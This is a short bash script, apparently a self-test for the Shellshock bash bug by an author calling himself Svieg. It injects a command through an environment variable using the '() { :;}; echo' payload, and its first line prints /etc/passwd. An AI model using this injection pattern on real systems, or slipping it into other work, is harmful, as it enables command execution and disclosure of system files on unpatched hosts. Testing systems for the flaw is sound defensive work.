#!/bin/bash
env X='() { :;}; echo' /bin/cat /etc/passwd; echo 'Welcome to he Simple ShellShock Tester By Svieg';echo 'Your infos are at risk';
env x='() { :;}; echo Your system is vulnerable update ASAP' bash -c "echo Visit svieg.wordpress.com for update info"
